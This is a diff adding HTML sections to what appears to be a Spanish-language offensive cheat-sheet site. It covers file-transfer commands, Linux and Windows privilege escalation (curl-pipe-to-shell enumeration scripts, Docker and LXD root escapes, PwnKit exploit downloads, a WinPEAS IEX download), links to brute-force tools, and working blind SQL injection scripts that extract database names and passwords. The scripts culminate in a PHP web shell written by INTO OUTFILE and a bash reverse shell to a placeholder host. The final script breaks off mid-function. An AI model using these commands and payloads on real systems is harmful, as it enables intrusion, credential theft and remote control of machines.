+                <span style="color: rgb(20, 115, 120);">curl <span style="color: rgb(180, 109, 68);">-s</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">url</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-o</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">output</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <strong>PowerShell</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                &#x28;<span style="color: rgb(20, 115, 120);">New-Object <span
+                        style="color: white;">Net.WebClient&#41;.DownloadString('&lt;url&gt;')</span> <span
+                        style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">output</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <strong>Batch</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(167, 82, 33)">certutil <span style="color: white;">-urlcache -split
+                        -f</span> <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">url</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">output</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SMB</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SMB Server</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">smbserver.py <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">share</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: white">$(<span style="color: rgb(20, 115, 120);">pwd</span>)</span> <span
+                        style="color: rgb(180, 109, 68);">-smb2support</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Download</h3>
+            <br>
+            <strong>Linux</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">smbclient <span style="color: rgb(180, 109, 68);">//</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">ip</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">share</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(180, 109, 68);">-c</span>
+                    <span style="color: white;">"get &lt;file&gt; &lt;output&gt;"</span>
+
+            </div>
+            <br>
+            <strong>Windows</strong>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(167, 82, 33)">copy
+                    <span style="color: white;">\\&lt;ip&gt;\&lt;share&gt;\&lt;file&gt; &lt;output&gt;</span>
+
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Ncat</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Send</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">nc <span style="color: rgb(180, 109, 68);">-nlvp</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&lt;</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">file</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Recieve</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">nc <span style="color: rgb(180, 109, 68);">-nlvp</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&gt;</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">output</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Bash</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Send</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">cat <span style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">file</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&gt;</span> <span
+                        style="color: rgb(180, 109, 68);">/dev/tcp/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">ip</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Recieve</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">cat <span style="color: rgb(167, 82, 33)">&lt;</span> <span
+                        style="color: rgb(180, 109, 68);">/dev/tcp/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">target</span><span
+                        style="color: rgb(167, 82, 33)">&gt;</span><span style="color: rgb(180, 109, 68);">/</span><span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">port</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+                    <span style="color: rgb(167, 82, 33)">&gt;</span> <span
+                        style="color: rgb(167, 82, 33)">&lt;</span><span
+                        style="color: rgb(180, 109, 68);">output</span><span style="color: rgb(167, 82, 33)">&gt;</span>
+
+            </div>
+        </div>
+        <div id="linux-privilege-escalation" class="content-item">
+            <h2>$ Linux Privilege Escalation _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Tools</h3>
+            <br>
+            <a class="link-command" href="https://github.com/peass-ng/PEASS-ng" target="_blank">LinPEAS</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">curl <span style="color: rgb(180, 109, 68);">-sL
+                        https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</span> <span
+                        style="color: rgb(167, 82, 33)">|</span> <span style="color: rgb(20, 115, 120);">sh</span>
+            </div>
+            <br>
+            <a class="link-command" href="https://github.com/diego-treitos/linux-smart-enumeration"
+                target="_blank">LSE</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">curl <span style="color: rgb(180, 109, 68);">-sL
+                        https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh</span>
+                    <span style="color: rgb(167, 82, 33)">|</span> <span style="color: rgb(20, 115, 120);">bash</span>
+            </div>
+            <br>
+            <a class="link-command" href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">curl <span style="color: rgb(180, 109, 68);">-sL
+                        https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</span>
+                    <span style="color: rgb(167, 82, 33)">|</span> <span style="color: rgb(20, 115, 120);">bash</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">System Info</h3>
+            <br>
+            <p>Obtenga información sobre la arquitectura, distribución y versión del kernel del sistema.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">uname</span> <span style="color: rgb(180, 109, 68);">-a</span>
+                <span style="color: rgb(53, 81, 98);"># System information</span><br>
+                <span style="color: rgb(20, 115, 120);">lsb_release</span> <span
+                    style="color: rgb(180, 109, 68);">-a</span> <span style="color: rgb(53, 81, 98);"># Distribution
+                    information</span><br>
+                <span style="color: rgb(20, 115, 120);">getconf</span> <span
+                    style="color: rgb(180, 109, 68);">LONG_BIT</span> <span style="color: rgb(53, 81, 98);"># System
+                    architecture</span><br>
+                <span style="color: rgb(20, 115, 120);">cat</span> <span
+                    style="color: rgb(180, 109, 68);">/proc/version</span> <span style="color: rgb(53, 81, 98);">#
+                    Kernel version</span><br>
+                <span style="color: rgb(20, 115, 120);">cat</span> <span
+                    style="color: rgb(180, 109, 68);">/etc/os-release</span> <span style="color: rgb(53, 81, 98);"># OS
+                    details</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Path</h3>
+            <br>
+            <p>Compruebe si tiene permisos de escritura para algún directorio en el PATH.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">echo</span> $PATH | <span
+                    style="color: rgb(20, 115, 120);">tr</span> ':' '\n' | <span
+                    style="color: rgb(20, 115, 120);">sort</span> <span style="color: rgb(180, 109, 68);">-u</span> |
+                <span style="color: rgb(20, 115, 120);">xargs</span> <span style="color: rgb(180, 109, 68);">-I</span>{}
+                bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Enviroment Variables</h3>
+            <br>
+            <p>En ocasiones podemos encontrar contraseñas o información sensible en variables de entorno.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">env</span> <span style="color: rgb(53, 81, 98);"># Environment
+                    variables</span><br>
+                <span style="color: rgb(20, 115, 120);">set</span> <span style="color: rgb(53, 81, 98);"># Shell
+                    variables</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Groups</h3>
+            <br>
+            <p>Lista de todos los grupos a los que pertenecen los usuarios.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">id</span> [user]<br>
+                <span style="color: rgb(20, 115, 120);">groups</span> [user]<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Docker</h3>
+            <br>
+            <p>Si pertenece al grupo Docker, puede montar el sistema de archivos dentro de un contenedor y tener acceso
+                completo a él, lo que le permitirá modificarlo.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">docker</span> <span style="color: rgb(180, 109, 68);">run -it
+                    --rm -v /:/mnt alpine chroot /mnt sh</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">LXD/LXC</h3>
+            <br>
+            <p>De manera similar a Docker, con LXD/LXC, también podemos montar el sistema de archivos dentro de un
+                contenedor, otorgándole acceso completo.</p>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># On your machine, download and build an alpine image and transfer
+                    it to the host</span><br>
+                <span style="color: rgb(20, 115, 120);">git</span> <span style="color: rgb(180, 109, 68);">clone
+                    https://github.com/saghul/lxd-alpine-builder</span> <span
+                    style="color: rgb(137, 198, 255);">&&</span>
+                <span style="color: rgb(20, 115, 120);">cd</span> <span
+                    style="color: rgb(180, 109, 68);">lxd-alpine-builder</span> <span
+                    style="color: rgb(137, 198, 255);">&&</span> <span style="color: rgb(20, 115, 120);">sudo</span>
+                <span style="color: rgb(180, 109, 68);">./build-alpine</span><br>
+            </div>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># Import the image</span><br>
+                <span style="color: rgb(20, 115, 120);">lxc</span> <span style="color: rgb(180, 109, 68);">image import
+                    ./alpine.tar.gz --alias privimg</span><br>
+                <span style="color: rgb(53, 81, 98);"># Create the containter</span><br>
+                <span style="color: rgb(20, 115, 120);">lxc</span> <span style="color: rgb(180, 109, 68);">init privimg
+                    privcont -c security.privileged=true</span><br>
+                <span style="color: rgb(53, 81, 98);"># Mount the filesystem</span><br>
+                <span style="color: rgb(20, 115, 120);">lxc</span> <span style="color: rgb(180, 109, 68);">config device
+                    add privcont privdev disk source=/
+                    path=/mnt/root recursive=true</span><br>
+                <span style="color: rgb(53, 81, 98);"># Start the container</span><br>
+                <span style="color: rgb(20, 115, 120);">lxc</span> <span style="color: rgb(180, 109, 68);">start
+                    privcont</span><br>
+                <span style="color: rgb(53, 81, 98);"># Interactive shell</span><br>
+                <span style="color: rgb(20, 115, 120);">lxc</span> <span style="color: rgb(180, 109, 68);">exec privcont
+                    /bin/sh</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Sudo</h3>
+            <br>
+            <a class="link-command" href="https://gtfobins.github.io" target="_blank">GTFOBins Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(53, 81, 98);"># List user privileges</span><br>
+                <span style="color: rgb(20, 115, 120);">sudo</span> <span
+                    style="color: rgb(180, 109, 68);">-l</span><br>
+                <span style="color: rgb(53, 81, 98);"># Version</span><br>
+                <span style="color: rgb(20, 115, 120);">sudo</span> <span style="color: rgb(180, 109, 68);">-V</span>
+                <span style="color: rgb(167, 82, 33)">|</span>
+                <span style="color: rgb(20, 115, 120);">grep</span> "Sudo ver"<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Capabilities</h3>
+            <br>
+            <a class="link-command"
+                href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"
+                target="_blank">Hack_Tricks Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">getcap</span> <span style="color: rgb(180, 109, 68);">-r /
+                    2>/dev/null</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SUID</h3>
+            <br>
+            <a class="link-command" href="https://gtfobins.github.io" target="_blank">GTFOBins Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">find</span> <span style="color: rgb(180, 109, 68);">/ -type f
+                    -perm -4000 -ls 2>/dev/null</span>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Open Ports</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">ss</span> <span
+                    style="color: rgb(180, 109, 68);">-nltp</span><br>
+                <span style="color: rgb(20, 115, 120);">netstat</span> <span
+                    style="color: rgb(180, 109, 68);">-punta</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Cron Jobs</h3>
+            <br>
+            <a class="link-command"
+                href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs"
+                target="_blank">Hack_Tricks Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">crontab</span> <span
+                    style="color: rgb(180, 109, 68);">-l</span><br>
+                <span style="color: rgb(20, 115, 120);">find</span> <span style="color: rgb(180, 109, 68);">/ -name
+                    <span style="color: white;">"cron*"</span> 2>/dev/null</span><br>
+                <span style="color: rgb(20, 115, 120);">ls</span> <span style="color: rgb(180, 109, 68);">-l
+                    /var/log/syslog</span><br>
+                <span style="color: rgb(20, 115, 120);">ls</span> <span style="color: rgb(180, 109, 68);">-l
+                    /var/log/cron</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Process Monitor</h3>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225);">Puede agregar palabras a la lista negra en la <span
+                        class="nmap-box-into" style="color: rgb(225, 225, 225);">grep -Ev</span> sección.</span>
+            </div>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                old_ps=$(ps -eo user,command); while true; do new_ps=$(ps -eo user,command); \<br>
+                diff <(echo "$old_ps" ) <(echo "$new_ps" ) | grep "[\>\<]" | \<br>
+                    grep -Ev "kworker|user,command"; old_ps=$new_ps; done<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Writable Scripts</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">find</span> <span style="color: rgb(180, 109, 68);">/ -user
+                    &lt;USER&gt; -writable \( -name <span style="color: white;">"*.sh"</span> -o
+                    -name <span style="color: white;">"*.py"</span> \) -type f 2>/dev/null</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Passwords</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                grep -Eriao --color=always
+                '(password|passwd|pass|pwd|key|secret|token)[[:space:]]*[:=][[:space:]]*[^[:space:]]{6,}' . | awk '{
+                line = $0; sub(/^[^:]*:[^:]*:/, "", line); if (!seen[line]++) print $0; }'
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Exploits</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Polkit - (CVE-2021-4034)</h3>
+            <br>
+            <a class="link-command" href="https://github.com/Almorabea/pkexec-exploit/tree/main" target="_blank">GitHub
+                pkexec-exploit
+                Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">curl</span> <span style="color: rgb(180, 109, 68);">-sL
+                    https://raw.githubusercontent.com/Almorabea/pkexec-exploit/main/CVE-2021-4034.py \</span><br>
+                <span style="color: rgb(180, 109, 68);">-o PwnKit.py</span> <span
+                    style="color: rgb(137, 198, 255);">&&</span> <span style="color: rgb(20, 115, 120);">python3</span>
+                <span style="color: rgb(180, 109, 68);">PwnKit.py</span><br>
+            </div>
+            <br>
+            <a class="link-command" href="https://github.com/ly4k/PwnKit/tree/main" target="_blank">GitHub PwnKit
+                Link</a>
+            <br><br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(20, 115, 120);">curl</span> <span style="color: rgb(180, 109, 68);">-sL
+                    https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit \</span><br>
+                <span style="color: rgb(180, 109, 68);">-o PwnKit</span> <span
+                    style="color: rgb(137, 198, 255);">&&</span> <span style="color: rgb(20, 115, 120);">chmod</span>
+                <span style="color: rgb(180, 109, 68);">+x PwnKit</span> <span
+                    style="color: rgb(137, 198, 255);">&&</span>
+                <span style="color: rgb(20, 115, 120);">./PwnKit</span><br>
+            </div>
+        </div>
+        <div id="windows-privilege-escalation" class="content-item">
+            <h2>$ Windows Privilege Escalation _</h2>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">System Enumeration</h3>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">List Users</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(180, 109, 68);">net user</span><br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">User Privileges</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(180, 109, 68);">whoami</span> /priv<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">Search Files</h3>
+            <br>
+            <div class="command_into" style="font-weight: bold;">
+                <img src="img/exclamation.png" alt="Exclamation Icon" class="icon">
+                <span style="color: rgb(225, 225, 225);">Si no conoce la ruta completa del archivo o incluso la
+                    extensión, puede utilizar: <span class="nmap-box-into"
+                        style="color: rgb(225, 225, 225);">*&lt;FILE&gt;*</span></span>
+            </div>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                <span style="color: rgb(180, 109, 68);">cmd</span> /s <span
+                    style="color: rgb(180, 109, 68);">&lt;</span>FILE<span
+                    style="color: rgb(180, 109, 68);">&gt;</span><br>
+            </div>
+            <br>
+            <h3><a class="link-command" href="https://github.com/peass-ng/PEASS-ng" target="_blank">WinPEAS</a></h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                powershell "IEX(New-Object
+                Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
+            </div>
+        </div>
+        <div id="directorybrute" class="content-item">
+            <h2>$ Directorybrute _</h2>
+            <br>
+            <p>Directorybrute es una herramienta de fuerza bruta de directorios y archivos diseñada para descubrir
+                directorios y archivos ocultos en servidores web mediante solicitudes HTTP.</p>
+            <br>
+            <a class="link-command" href="https://github.com/D1se0/directorybrute" target="_blank">Link al
+                repositorio</a>
+        </div>
+        <div id="cerbero" class="content-item">
+            <h2>$ Cerbero _</h2>
+            <br>
+            <p>Cerbero es una herramienta de línea de comandos diseñada para realizar ataques de fuerza bruta contra
+                servicios SSH y FTP. Esta herramienta puede resultar útil para auditorías de seguridad o pruebas de
+                penetración donde es necesario probar la resistencia de las credenciales de acceso.</p>
+            <br>
+            <a class="link-command" href="https://github.com/D1se0/cerbero" target="_blank">Link al
+                repositorio</a>
+        </div>
+        <div id="subruteforce" class="content-item">
+            <h2>$ suBruteforce _</h2>
+            <br>
+            <p>suBruteforce es una herramienta de fuerza bruta diseñada para probar combinaciones de usuario y
+                contraseña en sistemas Unix utilizando el comando su. Esta herramienta está escrita en Python y
+                proporciona una interfaz amigable y personalizable para realizar ataques de fuerza bruta.</p>
+            <br>
+            <a class="link-command" href="https://github.com/D1se0/suBruteforce" target="_blank">Link al
+                repositorio</a>
+        </div>
+        <div id="sqlinjectionscripts" class="content-item">
+            <h2>$ SQL Injection Scripts _</h2>
+            <br>
+            <p>Aqui hay una muestra de vrios scripts que se tienen que modificar a gusto de cada uno para que haga su
+                cometido</p>
+            <br>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SQL Injection Databases</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                #!/usr/bin/python3<br>
+                <br>
+                from pwn import *<br>
+                import requests, pdb, string, signal, sys, time<br>
+                <br>
+                def def_handler(sig, frame):<br>
+                print("\n\n[!] Saliendo...\n")<br>
+                sys.exit(1)<br>
+                <br>
+                # Ctrl+C<br>
+                signal.signal(signal.SIGINT, def_handler)<br>
+                <br>
+                # Variables globales<br>
+                login_url = "http://&lt;IP&gt;/&lt;LOGIN&gt;"<br>
+                characters = string.ascii_lowercase + "-_"<br>
+                <br>
+                def makeRequest():<br>
+                <br>
+                p1 = log.progress("Fuerza bruta")<br>
+                p1.status("Iniciando proceso de fuerza bruta")<br>
+                <br>
+                time.sleep(2)<br>
+                <br>
+                database = ""<br>
+                <br>
+                p2 = log.progress("Usuario")<br>
+                <br>
+                for position in range(1, 22): #El rango de caracteres que pueda tener el usuario<br>
+                for character in characters:<br>
+                post_data = {<br>
+                'username' : "' or if(substr(database(),%d,1)='%s', sleep(5), 1)-- -" % (position, character),
+                #Aqui lo que hacemos es que mediantes sleep's y con la comparacion de si es 1 es True sacar el
+                nombre de la base de datos...<br>
+                'password' : 'test'<br>
+                }<br>
+                <br>
+                p1.status(post_data['username'])<br>
+                <br>
+                time_start = time.time()<br>
+                <br>
+                r = requests.post(login_url, data=post_data)<br>
+                <br>
+                time_end = time.time()<br>
+                <br>
+                if time_end - time_start > 5: #Parametro de la comparacion para saber si es True o False con los
+                tiempos de sleep's (Si tarda 5 segundos en responder es True, de lo contrario es False)<br>
+                <br>
+                database += character<br>
+                p2.status(database)<br>
+                break<br>
+                <br>
+                if __name__ == '__main__':<br>
+                <br>
+                makeRequest()<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SQL Injection Table_Name</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                #!/usr/bin/python3<br>
+                <br>
+                from pwn import *<br>
+                import requests, pdb, string, signal, sys, time<br>
+                <br>
+                def def_handler(sig, frame):<br>
+                print("\n\n[!] Saliendo...\n")<br>
+                sys.exit(1)<br>
+                <br>
+                # Ctrl+C<br>
+                signal.signal(signal.SIGINT, def_handler)<br>
+                <br>
+                # Variables globales<br>
+                login_url = "http://&lt;IP&gt;/&lt;LOGIN&gt;"
+                characters = string.ascii_lowercase + string.ascii_uppercase + string.digits<br>
+                <br>
+                def makeRequest():<br>
+                <br>
+                p1 = log.progress("Fuerza bruta")<br>
+                p1.status("Iniciando proceso de fuerza bruta")<br>
+                <br>
+                time.sleep(2)<br>
+                <br>
+                password = ""<br>
+                <br>
+                p2 = log.progress("Usuario")<br>
+                <br>
+                for position in range(1, 22): #El rango de caracteres que pueda tener el usuario<br>
+                for character in characters:<br>
+                post_data = {<br>
+                'username' : "' or (select hex(substring(password, %d,1)) from users where
+                username='enemigosss')=hex('%s')-- -" % (position, character), #Donde pone hex() significa que
+                estamos jugando con el formato hexadecimal para que nos detecte si es mayuscula o minuscula la
+                letra y con sus respectibos simbolos...<br>
+                'password' : 'test'<br>
+                }<br>
+                <br>
+                p1.status(post_data['username'])<br>
+                <br>
+                r = requests.post(login_url, data=post_data)<br>
+                <br>
+                if r.text == "1": #Parametro de la comparacion para saber si es True o False<br>
+                <br>
+                password += character<br>
+                p2.status(password)<br>
+                break<br>
+                <br>
+                if __name__ == '__main__':<br>
+                <br>
+                makeRequest()<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SQL Injection Username nad Password</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                #!/usr/bin/python3<br>
+                <br>
+                from pwn import *<br>
+                import requests, pdb, string, signal, sys, time<br>
+                <br>
+                def def_handler(sig, frame):<br>
+                print("\n\n[!] Saliendo...\n")<br>
+                sys.exit(1)<br>
+                <br>
+                # Ctrl+C<br>
+                signal.signal(signal.SIGINT, def_handler)<br>
+                <br>
+                # Variables globales<br>
+                login_url = "http://&lt;IP&gt;/&lt;LOGIN&gt;"<br>
+                characters = string.ascii_lowercase + "-_"<br>
+                <br>
+                def makeRequest():<br>
+                <br>
+                p1 = log.progress("Fuerza bruta")<br>
+                p1.status("Iniciando proceso de fuerza bruta")<br>
+                <br>
+                time.sleep(2)<br>
+                <br>
+                username = ""<br>
+                <br>
+                p2 = log.progress("Usuario")<br>
+                <br>
+                for position in range(1, 20): #El rango de caracteres que pueda tener el usuario<br>
+                for character in characters:<br>
+                post_data = {<br>
+                'username' : "' or (select substring(username, %d,1) from users limit 1)='%s'-- -" % (position,
+                character), #Donde pone username de esta linea es el contenido de la tabla que en este caso se
+                llama username que queremos descubrir ya que por defecto la tabla se llama asi, y la otra por
+                defecto para saber en nombre de usuario es name la cual tambien tendriamos que probar, si no
+                supieramos nada de esto, tendriamos que empezar explotando el nombre de la base de datos...<br>
+                'password' : 'test'<br>
+                }<br>
+                <br>
+                p1.status(post_data['username'])<br>
+                <br>
+                r = requests.post(login_url, data=post_data)<br>
+                <br>
+                if r.text == "1": #Parametro de la comparacion para saber si es True o False<br>
+                <br>
+                username += character<br>
+                p2.status(username)<br>
+                break<br>
+                <br>
+                if __name__ == '__main__':<br>
+                <br>
+                makeRequest()<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SQL Injection Deposit file</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                #!/usr/bin/python3<br>
+                <br>
+                from pwn import *<br>
+                import signal, pdb, requests<br>
+                <br>
+                def def_handler(sig, frame):<br>
+                print("\n\n[!] Saliendo...\n")<br>
+                sys.exit(1)<br>
+                <br>
+                #Ctlr+C<br>
+                signal.signal(signal.SIGINT, def_handler)<br>
+                <br>
+                if len(sys.argv) != 3:<br>
+                log.failure("Uso: %s &lt;ip-address&gt; filename" % sys.argv[0])<br>
+                sys.exit(1)<br>
+                <br>
+                # Varianles globales<br>
+                ip_address = sys.argv[1]<br>
+                filename = sys.argv[2]<br>
+                main_url = "http://%s/" % ip_address<br>
+                <br>
+                def createFile():<br>
+                <br>
+                data_post = {<br>
+                'username': 'admin',<br>
+                'country': """Brazil' UNION SELECT "
+                <?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % (filename)<br>
+                }<br>
+                <br>
+                r = requests.post(main_url, data=data_post)<br>
+                <br>
+                if __name__ == '__main__':<br>
+                <br>
+                createFile()<br>
+            </div>
+            <br>
+            <h3 style="font-weight: bold; font-size: 150%;">SQL Injection Deposit file + Reverse Shell</h3>
+            <br>
+            <div class="command" style="font-weight: bold;">
+                #!/usr/bin/python3<br>
+                <br>
+                from pwn import *<br>
+                import signal, pdb, requests<br>
+                <br>
+                def def_handler(sig, frame):<br>
+                print("\n\n[!] Saliendo...\n")<br>
+                sys.exit(1)<br>
+                <br>
+                #Ctlr+C<br>
+                signal.signal(signal.SIGINT, def_handler)<br>
+                <br>
+                if len(sys.argv) != 3:<br>
+                log.failure("Uso: %s &lt;ip-address&gt; filename" % sys.argv[0])<br>
+                sys.exit(1)<br>
+                <br>
+                # Varianles globales<br>
+                ip_address = sys.argv[1]<br>
+                filename = sys.argv[2]<br>
+                main_url = "http://%s/" % ip_address<br>
+                lport = &lt;PORT&gt;<br>
+                <br>
+                def createFile():<br>
+                <br>
+                data_post = {<br>
+                'username': 'admin',<br>
+                'country': """Brazil' UNION SELECT "
+                <?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/%s"-- -""" % (filename)<br>
+                }<br>
+                <br>
+                r = requests.post(main_url, data=data_post)<br>
+                <br>
+                def getAccess():<br>
+                <br>
+                data_post = {<br>
+                'cmd': "bash -c 'bash -i >& /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0>&1'"<br>
+                }<br>
+                <br>
+                r = requests.post(main_url + "%s" % filename, data=data_post)<br>
+                <br>
